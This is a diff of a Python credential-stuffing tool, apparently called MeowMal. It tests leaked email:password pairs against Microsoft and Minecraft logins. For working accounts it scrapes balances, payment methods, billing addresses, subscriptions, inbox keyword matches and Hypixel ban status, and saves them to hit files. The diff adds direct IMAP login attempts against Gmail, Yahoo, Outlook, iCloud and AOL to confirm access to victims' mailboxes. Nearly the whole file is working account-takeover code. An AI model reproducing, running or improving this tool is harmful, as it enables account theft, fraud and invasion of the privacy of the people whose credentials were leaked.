@@ -2,6 +2,8 @@
 import concurrent.futures
 import configparser
 import json
+import imaplib
+import ssl
 import os
 import shutil
 import random
@@ -26,7 +28,6 @@ from urllib3.util.retry import Retry
 warnings.filterwarnings('ignore')
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 _session_cache = {}
-
 def create_optimized_session(config=None):
     cache_key = 'default'
     if cache_key in _session_cache:
@@ -46,16 +47,13 @@ def create_optimized_session(config=None):
     _session_cache[cache_key] = session
     return session
 colorama_init(autoreset=False, strip=False)
-
 def get_optimized_timeout(config=None):
     if config and config.get('optimize_network', True):
         return (3, 5)
     else:
         return config.get('timeout', 8) if config else 10
-
 class SimpleUtils:
     _title_cache = ''
-
     @staticmethod
     def set_title(title):
         if title == SimpleUtils._title_cache:
@@ -68,7 +66,6 @@ class SimpleUtils:
             pass
 utils = SimpleUtils()
 _FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
-
 def format_number(num):
     if not isinstance(num, (int, float)):
         try:
@@ -83,15 +80,12 @@ def format_number(num):
             return f'{num / threshold:.{precision}f}{suffix}'
     return str(int(num))
 _DECORATIVE_SYMBOLS_RE = re.compile('[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+')
-
 def clean_name(name):
     if not name:
         return ''
     return _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
-
 def fetch_meowapi_stats(username, uuid=None):
     global config
-
     def format_coins(num):
         if not isinstance(num, (int, float)):
             return '0'
@@ -108,7 +102,6 @@ def fetch_meowapi_stats(username, uuid=None):
         if abs_num >= 1000.0:
             return f'{num / 1000.0:.0f}K'
         return str(int(num))
-
     def get_skill_average(member):
         skills = member.get('skills', {})
         total_level = 0
@@ -120,7 +113,6 @@ def fetch_meowapi_stats(username, uuid=None):
                 total_level += skill_data['levelWithProgress']
                 skill_count += 1
         return total_level / skill_count if skill_count > 0 else 0
-
     def clean_name_js(name):
         if not name:
             return ''
@@ -199,7 +191,6 @@ def fetch_meowapi_stats(username, uuid=None):
             if networth == 0 and coins > 0:
                 networth = coins
             avg_skill_level = get_skill_average(best_member)
-
             def collect_items(category_data):
                 items_list = []
                 if category_data and category_data.get('items'):
@@ -246,7 +237,6 @@ def fetch_meowapi_stats(username, uuid=None):
         return ' '.join(parts) if parts else None
     except Exception:
         return None
-
 def validate_hex_color(color_str):
     if not color_str:
         return None
@@ -284,7 +274,6 @@ try:
     import threading
     import sys as _sys
     _original_excepthook = threading.excepthook if hasattr(threading, 'excepthook') else None
-
     def _silent_excepthook(args):
         if args.exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
             return
@@ -295,7 +284,6 @@ try:
     if hasattr(threading, 'excepthook'):
         threading.excepthook = _silent_excepthook
     _original_sys_excepthook = _sys.excepthook
-
     def _silent_sys_excepthook(exc_type, exc_value, exc_traceback):
         if exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
             if exc_traceback and ('minecraft' in str(exc_traceback.tb_frame) or 'minecraft' in str(exc_value)):
@@ -313,9 +301,7 @@ FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
 LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
 BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
 SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')
-
 class UIManager:
-
     def __init__(self):
         self.width = 120
         self.height = 30
@@ -332,25 +318,19 @@ class UIManager:
         self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0}
         self.start_time = None
         self._lock = threading.Lock()
-
     def reset_log_area(self):
         self.log_start_line = max(15, self.height - 10)
         print(f'\x1b[{self.log_start_line};0H', end='')
         self.clear_from_cursor()
         self.log_area_count = 0
-
     def clear_screen(self):
         os.system('clear')
-
     def move_cursor_home(self):
         print('\x1b[H', end='')
-
     def clear_from_cursor(self):
         print('\x1b[J', end='')
-
     def _strip_ansi(self, text):
         return ANSI_ESCAPE.sub('', text)
-
     def show_ui_screen(self):
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
@@ -361,19 +341,14 @@ class UIManager:
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
             self.log_initialized = True
         return
-
     def screen_ui_log(self):
         return self.show_ui_screen()
-
     def log_info(self, message):
         print(f'{Fore.CYAN}[INFO] {message}{Fore.RESET}')
-
     def log_error(self, message):
         print(f'{Fore.RED}[ERROR] {message}{Fore.RESET}')
-
     def show_error_screen(self, error_msg):
         self.log_error(error_msg)
-
     def increment_stat(self, stat_name):
         if stat_name in self.stats:
             self.stats[stat_name] += 1
@@ -381,7 +356,6 @@ class UIManager:
             pass
         elif stat_name == 'unbanned':
             pass
-
     def show_finished_screen(self, results_folder):
         self.clear_screen()
         elapsed = self._get_elapsed_time()
@@ -411,7 +385,6 @@ class UIManager:
         print(f"{Fore.WHITE}Xgp: {Fore.LIGHTBLUE_EX}{self.stats['xgp']}{Fore.RESET}")
         print(f"{Fore.WHITE}Xgpu: {Fore.LIGHTCYAN_EX}{self.stats['xgpu']}{Fore.RESET}")
         print(f"{Fore.WHITE}Sfa: {Fore.YELLOW}{self.stats['sfa']}{Fore.RESET}\n")
-
     def add_log(self, message, level='INFO'):
         if level not in ('HIT', 'ERROR') and (not (level == 'INFO' and message.startswith('Other:'))):
             return
@@ -435,7 +408,6 @@ class UIManager:
                         self.reset_log_area()
                         log_line = log_start_line + 2
                     print(f'\x1b[{log_line};0H{log_entry}\x1b[K\x1b[{self.height};0H', end='', flush=True)
-                    
                     self.log_area_count += 1
                     if self.log_area_count >= getattr(self, 'log_area_limit', 20):
                         self.reset_log_area()
@@ -447,13 +419,10 @@ class UIManager:
             except Exception as e:
                 print(f'Debug: add_log error: {e}')
                 pass
-
     def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
         try:
-            
             elapsed_str = self._get_elapsed_time()
             time_part = f'[{elapsed_str}]'
-            
             if capture_obj.banned and capture_obj.banned != 'False':
                 status_part = '[Banned]'
                 color = Fore.RED
@@ -463,7 +432,6 @@ class UIManager:
                     color = Fore.CYAN
                 else:
                     color = Fore.GREEN
-            
             tags_part = ''
             if capture_obj.type:
                 type_upper = str(capture_obj.type).upper()
@@ -480,73 +448,54 @@ class UIManager:
                 tags_part += f'[{capture_obj.capes}]'
             if capture_obj.cape and capture_obj.cape == 'Yes':
                 tags_part += '[Optifine]'
-                    
             pwd = capture_obj.password
             if len(pwd) > 4:
                 masked_pwd = pwd[:2] + '*' * (len(pwd) - 4) + pwd[-2:]
             else:
                 masked_pwd = '*' * len(pwd)
-            
             if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
                 user_display = capture_obj.hypixl
             else:
                 user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
-
-            
             account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
-
             stats_part = ''
             if extra_stats:
                 clean_stats = extra_stats.strip(' |')
                 stats_part = f' | {clean_stats}'
-
             final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
-            
             colored_line = f'{color}{final_content}{Style.RESET_ALL}'
-            
             self.add_log(colored_line, 'HIT')
         except Exception:
             self.log_hit(getattr(capture_obj, 'email', ''), getattr(capture_obj, 'type', ''))
-
     def update_stats(self, **kwargs):
         for key, value in kwargs.items():
             if key in self.stats:
                 self.stats[key] = value
-
     def increment_stat(self, stat_name, amount=1):
         if stat_name in self.stats:
             self.stats[stat_name] += amount
-
     def start_checking(self, total):
         self.start_time = time.time()
         self.stats['total'] = total
         self.add_log(f'Starting check on {total} accounts...', 'INFO')
-
     def log_hit(self, email, account_type):
         self.add_log(f'HIT: {email} | Type: {account_type}', 'HIT')
-
     def log_bad(self, email):
         return
-
     def log_2fa(self, email):
         return
-
     def log_payment(self, email, details):
         self.add_log(f'PAYMENT: {email} | {details}', 'PAYMENT')
-
     def log_error(self, message):
         self.add_log(message, 'ERROR')
         self.increment_stat('errors')
-
     def log_info(self, message):
         self.add_log(message, 'INFO')
-
     def calculate_cpm(self):
         if self.start_time and self.stats['checked'] > 0:
             elapsed = time.time() - self.start_time
             if elapsed > 0:
                 self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
-
     def _get_elapsed_time(self):
         if not self.start_time:
             return '00:00:00'
@@ -555,18 +504,14 @@ class UIManager:
         minutes = elapsed % 3600 // 60
         seconds = elapsed % 60
         return f'{hours:02d}:{minutes:02d}:{seconds:02d}'
-
     def _get_percentage(self, value, total):
         if total == 0:
             return '0.0%'
         return f'{value / total * 100:.1f}%'
-
     def _strip_ansi(self, text):
         return ANSI_ESCAPE.sub('', text)
 ui = UIManager()
-
 class MicrosoftChecker:
-
     def __init__(self, session, email, password, config, fname):
         self.session = session
         self.email = email
@@ -575,7 +520,6 @@ class MicrosoftChecker:
         self.fname = fname
         self._token_cache = {}
         self._token_cache_timeout = 300
-
     def get_auth_token(self, client_id, scope, redirect_uri):
         cache_key = f'{client_id}:{scope}:{redirect_uri}'
         if cache_key in self._token_cache:
@@ -593,7 +537,6 @@ class MicrosoftChecker:
             return token
         except (requests.RequestException, TimeoutError, ConnectionError) as e:
             return None
-
     def check_balance(self):
         try:
             token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
@@ -611,7 +554,6 @@ class MicrosoftChecker:
             return '0.00 USD'
         except (requests.RequestException, TimeoutError, ConnectionError, json.JSONDecodeError):
             return None
-
     def check_rewards_points(self):
         try:
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
@@ -646,7 +588,6 @@ class MicrosoftChecker:
             return None
         except Exception:
             return None
-
     def check_payment_instruments(self):
         try:
             token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
@@ -675,7 +616,6 @@ class MicrosoftChecker:
             return instruments
         except Exception:
             return []
-
     def check_subscriptions(self):
         try:
             r = self.session.get('https://account.microsoft.com/services/api/subscriptions', timeout=15)
@@ -693,7 +633,6 @@ class MicrosoftChecker:
             return subs
         except Exception:
             return []
-
     def check_billing_address(self):
         try:
             r = self.session.get('https://account.microsoft.com/billing/api/addresses', timeout=15)
@@ -713,7 +652,6 @@ class MicrosoftChecker:
             return addresses
         except Exception:
             return []
-
     def check_inbox(self, keywords):
         try:
             scope = 'https://substrate.office.com/User-Internal.ReadWrite'
@@ -757,12 +695,10 @@ class MicrosoftChecker:
             return results
         except Exception:
             return []
-
 def check_microsoft_account(session, email, password, config, fname):
     try:
         checker = MicrosoftChecker(session, email, password, config, fname)
         results = {}
-
         def check_balance():
             if config.get('check_microsoft_balance'):
                 balance = checker.check_balance()
@@ -776,7 +712,6 @@ def check_microsoft_account(session, email, password, config, fname):
                     except Exception:
                         pass
             return None
-
         def check_rewards():
             if config.get('check_rewards_points', True):
                 points = checker.check_rewards_points()
@@ -785,14 +720,12 @@ def check_microsoft_account(session, email, password, config, fname):
                         f.write(f'{email}:{password} | Points: {points}\n')
                     return ('rewards_points', points)
             return None
-
         def check_payment():
             if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
                 instruments = checker.check_payment_instruments()
                 if instruments:
                     return ('payment_methods', instruments)
             return None
-
         def check_subs():
             if config.get('check_subscriptions'):
                 subs = checker.check_subscriptions()
@@ -801,7 +734,6 @@ def check_microsoft_account(session, email, password, config, fname):
                         f.write(f"{email}:{password} | Subs: {', '.join(subs)}\n")
                     return ('subscriptions', subs)
             return None
-
         def check_orders():
             if config.get('check_orders') or config.get('check_purchase_history'):
                 orders = checker.check_order_history()
@@ -813,7 +745,6 @@ def check_microsoft_account(session, email, password, config, fname):
                         f.write('----------------------------------------\n')
                     return ('orders', orders)
             return None
-
         def check_billing():
             if config.get('check_billing_address'):
                 addresses = checker.check_billing_address()
@@ -822,7 +753,6 @@ def check_microsoft_account(session, email, password, config, fname):
                         f.write(f"{email}:{password} | Address: {'; '.join(addresses)}\n")
                     return ('billing_addresses', addresses)
             return None
-
         def check_inbox():
             if config.get('scan_inbox'):
                 keywords_str = config.get('inbox_keywords', '')
@@ -850,9 +780,7 @@ def check_microsoft_account(session, email, password, config, fname):
         return {'balance': None}
     except Exception as e:
         return {'balance': None}
-
 class ConfigLoader:
-
     def __init__(self, config_file='config.ini'):
         self.config_file = config_file
         self.config = configparser.ConfigParser()
@@ -861,7 +789,6 @@ class ConfigLoader:
         self._cache_timestamp = 0
         self._cache_timeout = 60
         self.load_config()
-
     def load_config(self):
         current_time = time.time()
         if self._config_cache is not None and current_time - self._cache_timestamp < self._cache_timeout and os.path.exists(self.config_file):
@@ -879,10 +806,8 @@ class ConfigLoader:
         except (configparser.Error, IOError, OSError):
             self.create_default_config()
             return False
-
     def create_default_config(self):
-        self.settings = {'max_retries': 2, 'timeout': 10, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
-
+        self.settings = {'max_retries': 2, 'timeout': 10, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
     def parse_all_sections(self):
         for section in self.config.sections():
             for key, value in self.config.items(section):
@@ -890,7 +815,6 @@ class ConfigLoader:
                     self.settings[key] = self.parse_value(value)
                 except (ValueError, TypeError):
                     continue
-
     def parse_value(self, value):
         if not isinstance(value, str):
             return value
@@ -906,19 +830,14 @@ class ConfigLoader:
         except ValueError:
             pass
         return value
-
     def get(self, key, default=None):
         return self.settings.get(key, default)
-
     def get_proxy_config(self):
         return {'auto_proxy': self.get('auto_proxy', False), 'proxy_api': self.get('proxy_api', ''), 'request_num': self.get('request_num', 3), 'proxy_time': self.get('proxy_time', 5)}
-
     def get_checker_config(self):
-        return {'hypixelname': self.get('check_hypixel_rank', True), 'hypixellevel': self.get('check_hypixel_level', True), 'hypixelfirstlogin': self.get('check_hypixel_first_login', True), 'hypixellastlogin': self.get('check_hypixel_last_login', True), 'hypixelban': self.get('check_hypixel_ban_status', True), 'hypixelbwstars': self.get('check_bedwars_stars', True), 'hypixelsbcoins': self.get('check_skyblock_coins', True), 'payment': self.get('check_payment', True), 'access': self.get('check_email_access', True), 'optifinecape': self.get('check_optifine_cape', True), 'namechange': self.get('check_name_change', True), 'lastchanged': self.get('check_last_name_change', True), 'setname': self.get('auto_set_name', False), 'name': self.get('custom_name_format', 'MeowMal'), 'setskin': self.get('auto_set_skin', False), 'skin': self.get('skin_url', 'http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb'), 'variant': self.get('skin_variant', 'classic'), 'mark_mfa': self.get('mark_mfa', True), 'mark_sfa': self.get('mark_sfa', True), 'donut_api_key': self.get('donut_api_key', '')}
-
+        return {'hypixelname': self.get('check_hypixel_rank', True), 'hypixellevel': self.get('check_hypixel_level', True), 'hypixelfirstlogin': self.get('check_hypixel_first_login', True), 'hypixellastlogin': self.get('check_hypixel_last_login', True), 'hypixelban': self.get('check_hypixel_ban_status', True), 'hypixelbwstars': self.get('check_bedwars_stars', True), 'hypixelsbcoins': self.get('check_skyblock_coins', True), 'payment': self.get('check_payment', True), 'access': self.get('check_email_access', True), 'optifinecape': self.get('check_optifine_cape', True), 'namechange': self.get('check_name_change', True), 'lastchanged': self.get('check_last_name_change', True), 'setname': self.get('auto_set_name', False), 'name': self.get('custom_name_format', 'MeowMal'), 'setskin': self.get('auto_set_skin', False), 'skin': self.get('skin_url', 'http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb'), 'variant': self.get('skin_variant', 'classic'), 'mark_mfa': self.get('mark_mfa', True), 'mark_sfa': self.get('mark_sfa', True), 'donut_stats': self.get('donut_stats', True), 'donut_api_key': self.get('donut_api_key', ''), 'save_bad': self.get('save_bad', False)}
     def get_general_config(self):
         return {'max_retries': self.get('max_retries', 3), 'timeout': self.get('timeout', 15), 'threads': self.get('threads', 10), 'use_proxies': self.get('use_proxies', False)}
-
     def get_capture_config(self):
         return {'hypixel_name': self.get('hypixel_name', True), 'hypixel_level': self.get('hypixel_level', True), 'first_hypixel_login': self.get('first_hypixel_login', True), 'last_hypixel_login': self.get('last_hypixel_login', True), 'optifine_cape': self.get('optifine_cape', True), 'minecraft_capes': self.get('minecraft_capes', True), 'email_access': self.get('email_access', True), 'hypixel_skyblock_coins': self.get('hypixel_skyblock_coins', True), 'hypixel_bedwars_stars': self.get('hypixel_bedwars_stars', True), 'hypixel_ban': self.get('hypixel_ban', True), 'name_change_availability': self.get('name_change_availability', True), 'last_name_change': self.get('last_name_change', True), 'payment': self.get('payment', True), 'donut_stats': self.get('donut_stats', True)}
 sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
@@ -942,26 +861,19 @@ hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries,
 stats_lock = threading.Lock()
 urllib3.disable_warnings()
 warnings.filterwarnings('ignore')
-
 def is_no_proxy():
     pt = str(proxytype).strip()
     pt = pt.replace("'", '').replace('"', '')
     return pt == '4'
-
 class Config:
-
     def __init__(self):
         self.data = {}
-
     def set(self, key, value):
         self.data[key] = value
-
     def get(self, key, default=None):
         return self.data.get(key, default)
 config = Config()
-
 class Capture:
-
     def __init__(self, email, password, name, capes, uuid, token, type, session):
         self.email = email
         self.password = password
@@ -988,7 +900,6 @@ class Capture:
         self.ms_orders = []
         self.ms_payment_methods = []
         self.inbox_matches = []
-
     def builder(self, mask_password=False, include_timestamp=False):
         if self.banned and self.banned != 'False':
             ban_status = '[Banned]'
@@ -1045,13 +956,11 @@ class Capture:
             stats_parts.append(f'Pit_Coins: {self.pitcoins}')
         tags_str = ''.join(tags)
         stats_str = ' '.join(stats_parts) if stats_parts else ''
-        
         if self.hypixl and self.hypixl != 'N/A':
             user_display = self.hypixl
         else:
             user_display = self.name if self.name and self.name != 'N/A' else 'Unknown'
         capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
-        
         if include_timestamp:
             import time
             from datetime import datetime
@@ -1064,11 +973,9 @@ class Capture:
             else:
                 elapsed_time = '[00:00:00]'
             capture_line = f'{elapsed_time} {capture_line}'
-
         if stats_str:
             capture_line += f' | {stats_str}'
         return capture_line
-
     def hypixel(self):
         global errors
         try:
@@ -1079,7 +986,6 @@ class Capture:
                     tx = resp.text
                 except Exception:
                     raise
-
                 try:
                     if config.get('hypixelname'):
                         match = HYPIXEL_NAME.search(tx)
@@ -1089,7 +995,6 @@ class Capture:
                             if match_title:
                                 self.hypixl = match_title.group(1)
                             else:
-
                                 try:
                                     pattern = r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(self.name)
                                     match_brute = re.search(pattern, tx, re.IGNORECASE)
@@ -1097,7 +1002,6 @@ class Capture:
                                         self.hypixl = match_brute.group(0) 
                                 except:
                                     pass
-                         
                 except:
                     pass
                 try:
@@ -1143,7 +1047,6 @@ class Capture:
                     self.sbcoins = 'N/A'
         except:
             errors += 1
-
     def optifine(self):
         if config.get('optifinecape') and config.get('optifine_cape', True):
             try:
@@ -1154,27 +1057,52 @@ class Capture:
                     self.cape = 'Yes'
             except:
                 self.cape = 'Unknown'
-
     def full_access(self):
         global mfa, sfa
         if config.get('access') and config.get('email_access', True):
             try:
-                out = json.loads(self.session.get(f'https://email.avine.tools/check?email={self.email}&password={self.password}', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text)
-                if out['Success'] == 1:
+                try:
+                    domain = self.email.split('@')[1].lower()
+                except IndexError:
+                    self.access = 'False'
+                    sfa += 1
+                    return
+                imap_server = ''
+                if 'gmail.com' in domain or 'googlemail.com' in domain:
+                    imap_server = 'imap.gmail.com'
+                elif 'yahoo' in domain:
+                    imap_server = 'imap.mail.yahoo.com'
+                elif 'outlook' in domain or 'hotmail' in domain or 'live' in domain:
+                    imap_server = 'outlook.office365.com'
+                elif 'icloud' in domain or 'me.com' in domain or 'mac.com' in domain:
+                    imap_server = 'imap.mail.me.com'
+                elif 'aol.com' in domain:
+                    imap_server = 'imap.aol.com'
+                else:
+                    imap_server = f'imap.{domain}'
+                if not imap_server:
+                     imap_server = f'imap.{domain}'
+                try:
+                    mail = imaplib.IMAP4_SSL(imap_server, timeout=10)
+                    mail.login(self.email, self.password)
+                    mail.logout()
                     self.access = 'True'
                     mfa += 1
                     if config.get('mark_mfa', True):
                         rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                        open(f'results/{fname}/MFA.txt', 'a').write(f'{self.email}:{self.password}{rank_str}\n')
-                else:
+                        with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
+                             f.write(f'{self.email}:{self.password}{rank_str}\n')
+                except imaplib.IMAP4.error:
                     sfa += 1
                     self.access = 'False'
                     if config.get('mark_sfa', True):
                         rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
-                        open(f'results/{fname}/SFA.txt', 'a').write(f'{self.email}:{self.password}{rank_str}\n')
+                        with open(f'results/{fname}/SFA.txt', 'a', encoding='utf-8') as f:
+                             f.write(f'{self.email}:{self.password}{rank_str}\n')
+                except Exception as e:
+                    self.access = 'Unknown'
             except:
                 self.access = 'Unknown'
-
     def namechange(self):
         global retries
         if (config.get('namechange') or config.get('lastchanged')) and (config.get('name_change_availability', True) or config.get('last_name_change', True)):
@@ -1217,7 +1145,6 @@ class Capture:
                 except:
                     pass
                 tries += 1
-
     def check_donut_smp(self):
         if not config.get('donut_stats', True):
             return
@@ -1368,7 +1295,6 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_info(f'Donut SMP error: {str(e)[:100]}')
-
     def check_microsoft_features(self):
         global retries
         try:
@@ -1381,7 +1307,6 @@ class Capture:
                 self.inbox_matches = results.get('inbox_results', [])
         except Exception as e:
             retries += 1
-
     def ban(self, session):
         global errors
         if not MINECRAFT_AVAILABLE or not config.get('hypixelban'):
@@ -1392,13 +1317,11 @@ class Capture:
             tries = 0
             while tries < maxretries:
                 connection = Connection('alpha.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
-
                 @connection.listener(clientbound_login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     try:
                         data = json.loads(str(packet.json_data))
                         data_str = str(data)
-
                         if 'temporarily banned' in data_str:
                             try:
                                 duration = data['extra'][4]['text'].strip()
@@ -1410,7 +1333,6 @@ class Capture:
                                 f.write(f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
-                        
                         elif 'Suspicious activity' in data_str:
                             try:
                                 ban_id = data['extra'][6]['text'].strip()
@@ -1422,7 +1344,6 @@ class Capture:
                                 f.write(f'{self.email}:{self.password}{rank_str}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
-                                
                         elif 'You are permanently banned from this server!' in data_str:
                             try:
                                 reason = data['extra'][2]['text'].strip()
@@ -1434,34 +1355,28 @@ class Capture:
                                 f.write(f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
-
                         elif 'The Hypixel Alpha server is currently closed!' in data_str:
                             self.banned = 'False'
                             with open(f'results/{fname}/Unbanned.txt', 'a') as f:
                                 f.write(f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('unbanned')
-
                         elif 'Failed cloning your SkyBlock data' in data_str:
                             self.banned = 'False'
                             with open(f'results/{fname}/Unbanned.txt', 'a') as f:
                                 f.write(f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('unbanned')
-
                         else:
-                                                                                                                
                             extra_list = data.get('extra', [])
                             full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                             if not full_msg:
                                 full_msg = data.get('text', '')
-                            
                             self.banned = full_msg if full_msg else str(data)
                             with open(f'results/{fname}/Banned.txt', 'a') as f:
                                 f.write(f'{self.email}:{self.password}\n')
                             if UI_ENABLED and ui:
                                 ui.increment_stat('banned')
-
                     except Exception as e:
                         self.banned = f"Error parsing ban: {str(e)}"
                         with open(f'results/{fname}/Banned.txt', 'a') as f:
@@ -1469,33 +1384,26 @@ class Capture:
                         if UI_ENABLED and ui:
                             ui.increment_stat('banned')
                             ui.log_error(f"Ban parse error: {e}")
-
                 def _mark_unbanned(packet_name):
                     if self.banned == None:
                         self.banned = 'False'
                         with open(f'results/{fname}/Unbanned.txt', 'a') as f:
                             f.write(f'{self.email}:{self.password}\n')
                         if UI_ENABLED and ui:
-
                             ui.increment_stat('unbanned')
                             ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
-
                 @connection.listener(clientbound_play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     _mark_unbanned('JoinGame')
-
                 @connection.listener(clientbound_play.KeepAlivePacket, early=True)
                 def keep_alive(packet):
                     _mark_unbanned('KeepAlive')
-
                 @connection.listener(clientbound_play.PlayerPositionAndLookPacket, early=True)
                 def position_look(packet):
                     _mark_unbanned('PosLook')
-
                 @connection.listener(clientbound_play.TimeUpdatePacket, early=True)
                 def time_update(packet):
                     _mark_unbanned('TimeUpdate')
-
                 @connection.listener(clientbound_play.RespawnPacket, early=True)
                 def respawn(packet):
                     _mark_unbanned('Respawn')
@@ -1517,8 +1425,6 @@ class Capture:
                         while self.banned == None and c < 2000:
                             time.sleep(0.01)
                             c += 1
-                        if self.banned == None:
-                            _mark_unbanned('Timeout')
                         connection.disconnect()
                     except (EOFError, ConnectionError, OSError, Exception):
                         pass
@@ -1530,7 +1436,6 @@ class Capture:
                 tries += 1
         except Exception:
             errors += 1
-
     def setname(self):
         name_format = config.get('name')
         newname = name_format
@@ -1555,7 +1460,6 @@ class Capture:
             except:
                 pass
             tries += 1
-
     def setskin(self):
         tries = 0
         while tries < maxretries:
@@ -1570,7 +1474,6 @@ class Capture:
             except:
                 pass
             tries += 1
-
     def build_json_capture(self):
         capture_data = {'username': self.name if self.name != 'N/A' else '', 'hypixel_rank': self.hypixl if self.hypixl else 'N/A', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
         if capture_data['banned']:
@@ -1580,7 +1483,6 @@ class Capture:
             if ban_info.get('duration'):
                 capture_data['ban_duration'] = ban_info['duration']
         return capture_data
-
     def _parse_ban_info(self, ban_text):
         ban_info = {}
         if not ban_text or not isinstance(ban_text, str):
@@ -1606,7 +1508,6 @@ class Capture:
             ban_info['reason'] = 'Suspicious activity'
         ban_info['full_message'] = ban_text
         return ban_info
-
     def _format_duration_short(self, original_text, total_days):
         try:
             text_lower = original_text.lower()
@@ -1627,7 +1528,6 @@ class Capture:
             return f'{total_days}d'
         except:
             return original_text
-
     def _duration_to_days(self, text):
         if not text:
             return None
@@ -1654,7 +1554,6 @@ class Capture:
             return total_days if total_days > 0 else None
         except:
             return None
-
     def _format_seconds(self, seconds_value):
         try:
             total_seconds = int(seconds_value)
@@ -1675,7 +1574,6 @@ class Capture:
         if not parts:
             parts.append(f'{seconds}s')
         return ' '.join(parts)
-
     def save_json_capture(self):
         try:
             json_data = self.build_json_capture()
@@ -1698,7 +1596,6 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f'Failed to save capture: {str(e)[:50]}')
-
